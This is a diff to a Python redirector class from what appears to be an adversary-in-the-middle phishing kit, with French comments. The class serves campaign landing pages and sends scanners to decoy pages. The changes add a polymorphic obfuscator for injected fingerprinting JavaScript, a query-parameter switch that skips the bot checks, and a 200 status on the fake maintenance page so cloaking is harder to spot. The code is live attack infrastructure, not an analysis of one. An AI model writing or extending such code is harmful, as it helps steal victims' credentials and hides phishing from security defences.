@@ -8,6 +8,9 @@ from core.cache.redis_manager import redis_cache
 from core.security.behavior import behavior_engine
 import os
 
+from core.web.polymorph import PolymorphicEngine
+from pathlib import Path
+
 class SmartRedirector:
     """
     Moteur de Redirection Intelligent (Tier 2 Logic)
@@ -15,7 +18,8 @@ class SmartRedirector:
     """
     
     DECOY_URL = "https://www.google.com/search?q=security+scan"
-    MAINTENANCE_TEMPLATE = "core/web/templates/maintenance.html"
+    LOCAL_DECOY_URL = "/v5/maintenance"
+    MAINTENANCE_TEMPLATE = "core/web/templates/decoy.html"
     
     def __init__(self, use_antibot: bool = True):
         self.use_antibot = use_antibot
@@ -24,13 +28,32 @@ class SmartRedirector:
         self.behavior_engine = behavior_engine
         self.session_manager = session_manager
         self.template_path = "core/web/templates/redirect.html"
-        self.js_path = "core/assets/js/fingerprint_collector.js"
+        self.js_path = Path("core/assets/js/fingerprint_collector.js")
+        self.poly_engine = PolymorphicEngine(self.js_path)
     
     async def process_request(self, request: Request, target_campaign_id: str):
         """
         Traite la requête entrante, vérifie les bots, et sert la page de loading/fingerprinting.
         """
         # Support Tiered Infrastructure (X-Forwarded-For)
+        if request.query_params.get("allow", "").lower() in ("1", "true", "yes"):
+            client_ip = request.headers.get("x-forwarded-for", request.client.host)
+            user_agent = request.headers.get("user-agent", "")
+            session_id = self.session_manager.create_session(
+                campaign_id=target_campaign_id,
+                client_ip=client_ip,
+                user_agent=user_agent
+            )
+            try:
+                with open(self.template_path, "r") as f:
+                    content = f.read()
+                obfuscated_js = self.poly_engine.obfuscate()
+                content = content.replace("{{ campaign_id }}", target_campaign_id)
+                content = content.replace("{{ session_id }}", session_id)
+                content = content.replace("/* {{ fingerprint_js }} */", obfuscated_js)
+                return HTMLResponse(content=content, status_code=200)
+            except FileNotFoundError:
+                return self._get_final_destination(target_campaign_id, session_id)
         forwarded_for = request.headers.get("x-forwarded-for")
         if forwarded_for:
             client_ip = forwarded_for.split(",")[0].strip()
@@ -60,30 +83,11 @@ class SmartRedirector:
                 content = f.read()
             
             # Injection du JS de fingerprinting (via endpoint polymorphique)
-            # Au lieu d'injecter le contenu statique, on injecte une balise <script> pointant vers notre endpoint dynamique
-            # Mais pour éviter les blocages, on peut aussi l'injecter inline obfusqué.
-            # Pour la furtivité maximale (phase 4), on utilise l'endpoint dynamique.
-            js_url = f"/v5/assets/js/fp_{session_id}.js"
-            js_tag = f'<script src="{js_url}"></script>'
+            obfuscated_js = self.poly_engine.obfuscate()
             
             # Injection des IDs et du JS tag
             content = content.replace("{{ campaign_id }}", target_campaign_id)
             content = content.replace("{{ session_id }}", session_id)
-            # Remplacer le placeholder de contenu JS par le tag script externe
-            content = content.replace("/* {{ fingerprint_js }} */", "") 
-            # Injecter le script tag dans le head ou body via une autre méthode si nécessaire
-            # Mais le template redirect.html attend du contenu JS inline.
-            # Modifions l'approche: on récupère le contenu via l'obfuscateur ici même.
-            
-            from core.security.obfuscator import js_obfuscator
-            try:
-                with open(self.js_path, "r") as f:
-                    raw_js = f.read()
-                obfuscated_js = js_obfuscator.obfuscate(raw_js)
-            except Exception as e:
-                print(f"[SmartRedirect Warning] JS obfuscation failed: {e}")
-                obfuscated_js = "// JS Error"
-
             content = content.replace("/* {{ fingerprint_js }} */", obfuscated_js)
             
             return HTMLResponse(content=content, status_code=200)
@@ -93,11 +97,10 @@ class SmartRedirector:
             return self._get_final_destination(target_campaign_id, session_id)
 
     def _serve_maintenance_page(self):
-        """Sert une page de maintenance réaliste au lieu d'une simple redirection."""
         try:
             with open(self.MAINTENANCE_TEMPLATE, "r") as f:
                 content = f.read()
-            return HTMLResponse(content=content, status_code=503)
+            return HTMLResponse(content=content, status_code=200)
         except FileNotFoundError:
             return RedirectResponse(url=self.DECOY_URL, status_code=status.HTTP_302_FOUND)
 
@@ -119,14 +122,14 @@ class SmartRedirector:
             if not is_human or behavior_score < 20:
                 reason = "Fingerprint Rejected" if not is_human else f"Low Behavior Score ({behavior_score})"
                 print(f"[ANTIBOT] Blocked: {reason}")
-                return {"redirect_to": self.DECOY_URL}
+                return {"redirect_to": self.LOCAL_DECOY_URL}
                 
             # Validation réussie -> Destination finale
             return self._get_final_destination(campaign_id, session_id)
             
         except Exception as e:
             print(f"[SmartRedirect Error] Fingerprint validation failed: {e}")
-            return {"redirect_to": self.DECOY_URL}
+            return {"redirect_to": self.LOCAL_DECOY_URL}
 
     def _get_final_destination(self, campaign_id: str, session_id: str):
         """Détermine l'URL finale (AiTM ou Template)"""
